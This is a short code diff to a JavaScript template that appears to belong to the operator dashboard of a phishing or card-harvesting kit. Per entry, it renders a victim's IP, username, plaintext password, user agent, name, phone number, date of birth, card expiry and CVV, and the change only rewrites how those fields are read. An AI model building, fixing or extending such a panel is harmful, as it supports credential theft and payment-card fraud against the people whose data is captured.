@@ -157,15 +157,15 @@
             IP: ${ipAddress}
         </div>
         <ul class="list-group list-group-flush">
-            <li class="list-group-item">Username: ${details.getUserData[0].username || 'N/A'}</li>
-            <li class="list-group-item">Password: ${details.getUserData[0].password || 'N/A'}</li>
-            <li class="list-group-item">UserAgent: ${details.getUserData[0].userAgent || 'N/A'}</li>
-            <li class="list-group-item">Fist Name: ${details.getUserData[1].fname || 'N/A'}</li>
-            <li class="list-group-item">Last Name: ${details.getUserData[1].lname || 'N/A'}</li>
-            <li class="list-group-item">Phone Number: ${details.getUserData[1].phone || 'N/A'}</li>
-            <li class="list-group-item">DOB: ${details.getUserData.dob1[1] || 'N/A'}/${details.getUserData[1].dob2 || 'N/A'}/${details.getUserData[1].dob3 || 'N/A'}</li>
-            <li class="list-group-item">Exp: ${details.getUserData[2].exp1 || 'N/A'}/${details.getUserData[2].exp1 || 'N/A'}</li>
-            <li class="list-group-item">Cvv: ${details.getUserData[2].cvv || 'N/A'}</li>
+            <li class="list-group-item">Username: ${details.getUserData.username || 'N/A'}</li>
+            <li class="list-group-item">Password: ${details.getUserData.password || 'N/A'}</li>
+            <li class="list-group-item">UserAgent: ${details.getUserData.userAgent || 'N/A'}</li>
+            <li class="list-group-item">Fist Name: ${details.getUserData.fname || 'N/A'}</li>
+            <li class="list-group-item">Last Name: ${details.getUserData.lname || 'N/A'}</li>
+            <li class="list-group-item">Phone Number: ${details.getUserData.phone || 'N/A'}</li>
+            <li class="list-group-item">DOB: ${details.getUserData.dob1 || 'N/A'}/${details.getUserData.dob2 || 'N/A'}/${details.getUserData.dob3 || 'N/A'}</li>
+            <li class="list-group-item">Exp: ${details.getUserData.exp1 || 'N/A'}/${details.getUserData.exp1 || 'N/A'}</li>
+            <li class="list-group-item">Cvv: ${details.getUserData.cvv || 'N/A'}</li>
         </ul>
     </div>`;
                    } else {
